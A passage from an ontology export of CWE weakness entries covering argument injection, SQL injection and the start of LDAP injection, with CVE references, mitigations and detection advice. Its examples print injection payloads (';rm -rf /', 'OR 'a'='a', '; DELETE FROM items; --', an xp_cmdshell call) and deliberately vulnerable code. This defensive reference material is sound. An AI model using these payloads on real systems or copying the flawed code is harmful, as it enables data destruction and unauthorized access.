     Annotations: rdfs:comment "Argument injection vulnerability in the URI handler in Skype 2.0.*.104 and 2.5.*.0 through 2.5.*.78 for Windows allows remote authorized attackers to download arbitrary files via a URL that contains certain command-line switches."^^xsd:string
                 
                 references  CVE-2006-2312,
     
     Annotations: rdfs:comment "Argument injection vulnerability in WinSCP 3.8.1 build 328 allows remote attackers to upload or download arbitrary files via encoded spaces and double-quote characters in a scp or sftp URI."^^xsd:string
                 
                 references  CVE-2006-3015,
     
     Annotations: rdfs:comment "Argument injection vulnerability in the Windows Object Packager (packager.exe) in Microsoft Windows XP SP1 and SP2 and Server 2003 SP1 and earlier allows remote user-assisted attackers to execute arbitrary commands via a crafted file with a \"/\" (slash) character in the filename of the Command Line property, followed by a valid file extension, which causes the command before the slash to be executed, aka \"Object Packager Dialogue Spoofing Vulnerability.\""^^xsd:string
                 
                 references  CVE-2006-4692,
     
     Annotations: rdfs:comment "Argument injection vulnerability in HyperAccess 8.4 allows user-assisted remote attackers to execute arbitrary vbscript and commands via the /r option in a telnet:// URI, which is configured to use hawin32.exe."^^xsd:string
                 
                 references  CVE-2006-6597,
     
     Annotations: rdfs:comment "Argument injection vulnerability in the telnet daemon (in.telnetd) in Solaris 10 and 11 (SunOS 5.10 and 5.11) misinterprets certain client \"-f\" sequences as valid requests for the login program to skip authentication, which allows remote attackers to log into certain accounts, as demonstrated by the bin account."^^xsd:string
                 
                 references  CVE-2007-0882,
     
     Annotations: rdfs:comment "Try All Common Switches"^^xsd:string
                 
                 related_attack_patterns  CAPEC-133,
     
     Annotations: rdfs:comment "Using Meta-characters in E-mail Headers to Inject Malicious Payloads"^^xsd:string
                 
                 related_attack_patterns  CAPEC-41,
     
     Annotations: rdfs:comment "HTTP Parameter Pollution (HPP)"^^xsd:string
                 
                 related_attack_patterns  CAPEC-460,
     
     Annotations: rdfs:comment "OS Command Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-88,
     ID  "88"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Input Validation

Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, request headers as well as content, URL components, e-mail, files, databases, and any external systems that provide data to the application. Perform input validation at well-defined interfaces."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "Alter Execution Logic"^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Modify Application Data"^^xsd:string,
     availability  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could include arguments that allow unintended commands or code to be executed, allow sensitive data to be read or modified or could cause other unintended behavior."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Alter Execution Logic"^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.

(bad code)
Example Language: C 
int main(int argc, char** argv) {
char cmd[CMD_MAX] = \"/usr/bin/cat \";
strcat(cmd, argv[1]);
system(cmd);
}
Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form \";rm -rf /\", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.

Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained."^^xsd:string, 
                 rdfs:comment "Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.
Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."^^xsd:string, 
                 rdfs:comment "When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so."^^xsd:string, 
                 rdfs:comment "When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Alter Execution Logic"^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Alter Execution Logic"^^xsd:string,
     other  "Execute Unauthorized Code or Commands"^^xsd:string,
     other  "Modify Application Data"^^xsd:string,
     other  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."^^xsd:string, 
                 rdfs:comment "Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results."^^xsd:string
                 
                 testing  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-89_Improper_Neutralization_of_Special_Elements_used_in_an_SQL_Command

    Annotations: 
        rdfs:comment "Relationship:
SQL injection can be resultant from special character mismanagement, MAID, or blacklist/whitelist problems. It can be primary to authentication errors."^^xsd:string,
        rdfs:comment "The software constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component."^^xsd:string,
        rdfs:comment "Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.

SQL injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or software package with even a minimal user base is likely to be subject to an attempted attack of this kind. This flaw depends on the fact that SQL makes no real distinction between the control and data planes."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "SQL injection in security product, using a crafted group name."^^xsd:string
                 
                 references  CVE-2003-0377,
     
     Annotations: rdfs:comment "chain: SQL injection in library intended for database authentication allows SQL injection and authentication bypass."^^xsd:string
                 
                 references  CVE-2004-0366,
     
     Annotations: rdfs:comment "SQL injection via user name."^^xsd:string
                 
                 references  CVE-2007-6602,
     
     Annotations: rdfs:comment "SQL injection through an ID that was supposed to be numeric."^^xsd:string
                 
                 references  CVE-2008-2223,
     
     Annotations: rdfs:comment "SQL injection in authentication library."^^xsd:string
                 
                 references  CVE-2008-2380,
     
     Annotations: rdfs:comment "SQL injection through an ID that was supposed to be numeric."^^xsd:string
                 
                 references  CVE-2008-2790,
     
     Annotations: rdfs:comment "SQL injection via user name or password fields."^^xsd:string
                 
                 references  CVE-2008-5817,
     
     Annotations: rdfs:comment "SQL injection in vulnerability management and reporting tool, using a crafted password."^^xsd:string
                 
                 references  CVE-2017-11508,
     
     Annotations: rdfs:comment "Command Line Execution through SQL Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-108,
     
     Annotations: rdfs:comment "Object Relational Mapping Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-109,
     
     Annotations: rdfs:comment "SQL Injection through SOAP Parameter Tampering"^^xsd:string
                 
                 related_attack_patterns  CAPEC-110,
     
     Annotations: rdfs:comment "Expanding Control over the Operating System from the Database"^^xsd:string
                 
                 related_attack_patterns  CAPEC-470,
     
     Annotations: rdfs:comment "SQL Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-66,
     
     Annotations: rdfs:comment "Blind SQL Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-7,
     ID  "89"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "If authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a SQL injection vulnerability."^^xsd:string, 
                 rdfs:comment "If poor SQL commands are used to check user names and passwords, it may be possible to connect to a system as another user with no previous knowledge of the password."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."^^xsd:string, 
                 rdfs:comment "If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.
Process SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using \"exec\" or similar functionality, since this may re-introduce the possibility of SQL injection."^^xsd:string, 
                 rdfs:comment "Strategy: Enforcement by Conversion

When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly."^^xsd:string, 
                 rdfs:comment "This weakness typically appears in data-rich applications that save user inputs in a database."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Formal Methods / Correct-By-Construction
Cost effective for partial coverage:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL injection vulnerabilities."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
In 2008, a large number of web servers were compromised using the same SQL injection attack string. This single string worked against many different programs. The SQL injection was then used to modify the web sites to serve malicious code."^^xsd:string, 
                 rdfs:comment "Example 2
The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.

(bad code)
Example Language: C# 
...
string userName = ctx.getAuthenticatedUserName();
string query = \"SELECT * FROM items WHERE owner = '\" + userName + \"' AND itemname = '\" + ItemName.Text + \"'\";
sda = new SqlDataAdapter(query, conn);
DataTable dt = new DataTable();
sda.Fill(dt);
...
The query that this code intends to execute follows:

(informative)
 
SELECT * FROM items WHERE owner = <userName> AND itemname = <itemName>;
However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:

(attack code)
 
name' OR 'a'='a
for itemName, then the query becomes the following:

(attack code)
 
SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';
The addition of the:

(attack code)
 
OR 'a'='a
condition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:

(attack code)
 
SELECT * FROM items;
This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner."^^xsd:string, 
                 rdfs:comment "Example 3
This example examines the effects of a different malicious value passed to the query constructed and executed in the previous example.

If an attacker with the user name wiley enters the string:

(attack code)
 
name'; DELETE FROM items; --
for itemName, then the query becomes the following two queries:

(attack code)
Example Language: SQL 
SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';
DELETE FROM items;
--'
Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.

Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in the previous example.

If an attacker enters the string

(attack code)
 
name'; DELETE FROM items; SELECT * FROM items WHERE 'a'='a
Then the following three valid statements will be created:

(attack code)
 
SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';
DELETE FROM items;
SELECT * FROM items WHERE 'a'='a';
One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:

Target fields that are not quoted
Find ways to bypass the need for certain escaped meta-characters
Use stored procedures to hide the injected meta-characters.
Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.

Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they do not protect against many others. For example, the following PL/SQL procedure is vulnerable to the same SQL injection attack shown in the first example.

(bad code)
 
procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm in varchar2)
is open itm_cv for
' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND itemname = ' || itm || ';
end get_item;
Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks."^^xsd:string, 
                 rdfs:comment "Example 4
MS SQL has a built in function that enables shell command execution. An SQL injection in such a context could be disastrous. For example, a query of the form:

(bad code)
 
SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICE
Where $user_input is taken from an untrusted source.

If the user provides the string:

(attack code)
 
'; exec master..xp_cmdshell 'dir' --
The query will take the following form:

(attack code)
 
SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec master..xp_cmdshell 'dir' --' ORDER BY PRICE
Now, this query can be broken down into:

a first SQL query: SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='';
a second SQL query, which executes the dir command in the shell: exec master..xp_cmdshell 'dir'
an MS SQL comment: --' ORDER BY PRICE
As can be seen, the malicious input changes the semantics of the query into a query, a shell command execution and a comment."^^xsd:string, 
                 rdfs:comment "Example 5
This code intends to print a message summary given the message ID.

(bad code)
Example Language: PHP 
$id = $_COOKIE[\"mid\"];
mysql_query(\"SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'\");
The programmer may have skipped any input validation on $id under the assumption that attackers cannot modify the cookie. However, this is easy to do with custom client code or even in the web browser.

While $id is wrapped in single quotes in the call to mysql_query(), an attacker could simply change the incoming mid cookie to:

(attack code)
 
1432' or '1' = '1
This would produce the resulting query:

(result)
 
SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'
Not only will this retrieve message number 1432, it will retrieve all other messages.

In this case, the programmer could apply a simple modification to the code to eliminate the SQL injection:

(good code)
Example Language: PHP 
$id = intval($_COOKIE[\"mid\"]);
mysql_query(\"SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'\");
However, if this code is intended to support multiple users with different message boxes, the code might also need an access control check (CWE-285) to ensure that the application user has the permission to see that message."^^xsd:string, 
                 rdfs:comment "Example 6
This example attempts to take a last name provided by a user and enter it into a database.

(bad code)
Example Language: Perl 
$userKey = getUserID();
$name = getUserInput();

# ensure only letters, hyphens and apostrophe are allowed
$name = whiteList($name, \"^a-zA-z'-$\");
$query = \"INSERT INTO last_names VALUES('$userKey', '$name')\";
While the programmer applies a whitelist to the user input, it has shortcomings. First of all, the user is still allowed to provide hyphens which are used as comment structures in SQL. If a user specifies -- then the remainder of the statement will be treated as a comment, which may bypass security logic. Furthermore, the whitelist permits the apostrophe which is also a data / command separator in SQL. If a user supplies a name with an apostrophe, they may be able to alter the structure of the whole statement and even change control flow of the program, possibly accessing or modifying confidential information. In this situation, both the hyphen and apostrophe are legitimate characters for a last name and permitting them is required. Instead, a programmer may want to use a prepared statement or apply an encoding routine to the input to prevent any data / directive misinterpretations."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
Effectiveness: Moderate"^^xsd:string, 
                 rdfs:comment "Analysis with Automated Results Interpretation

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Database Scanners
Cost effective for partial coverage:
Web Application Scanner
Web Services Scanner
Effectiveness: High"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Fuzz Tester
Framework-based Fuzzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.
If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.
In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
When constructing SQL query strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.
Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name \"O'Reilly\" would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the \"'\" apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded.
When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes."^^xsd:string, 
                 rdfs:comment "Strategy: Output Encoding

While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Just as it may be possible to read sensitive information, it is also possible to make changes or even delete this information with a SQL injection attack."^^xsd:string
                 
                 integrity  "Modify Application Data"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large."^^xsd:string
                 
                 manual_analysis  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening

Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."^^xsd:string, 
                 rdfs:comment "Strategy: Firewall

Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
Effectiveness: Moderate

Note: An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.
Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or do not require any code changes.
Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke SQL commands, leading to false negatives - especially if the API/library code is not available for analysis.
Note: This is not a perfect solution, since 100% accuracy and coverage are not feasible."^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Bytecode Weakness Analysis - including disassembler + source code weakness analysis
Binary Weakness Analysis - including disassembler + source code weakness analysis
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: High"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Manual Source Code Review (not inspections)
Cost effective for partial coverage:
Focused Manual Spotcheck - Focused manual analysis of source
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     technologies  "Database Server"^^xsd:string
    
    
Individual: CWE-90_Improper_Neutralization_of_Special_Elements_used_in_an_LDAP_Query

    Annotations: 
        rdfs:comment "Relationship:
Factors: resultant to special character mismanagement, MAID, or blacklist/whitelist problems. Can be primary to authentication and verification errors."^^xsd:string,
        rdfs:comment "Research Gap:
Under-reported. This is likely found very frequently by third party code auditors, but there are very few publicly reported examples."^^xsd:string,
        rdfs:comment "The software constructs all or part of an LDAP query using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when it is sent to a downstream component."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Server does not properly escape LDAP queries, which allows remote attackers to cause a DoS and possibly conduct an LDAP injection attack."^^xsd:string
                 
                 references  CVE-2005-2301,
     
     Annotations: rdfs:comment "LDAP Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-136,
     ID  "90"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Modify Application Data"^^xsd:string,
     availability  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could include input that changes the LDAP query which allows unintended commands or code to be executed, allows sensitive data to be read or modified or causes other unintended behavior."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The code below constructs an LDAP query using user input address data:

(bad code)
Example Language: Java 
context = new InitialDirContext(env);
String searchFilter = \"StreetAddress=\" + address;
NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);
Because the code fails to neutralize the address string used to construct the query, an attacker can supply an address that includes additional LDAP queries."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
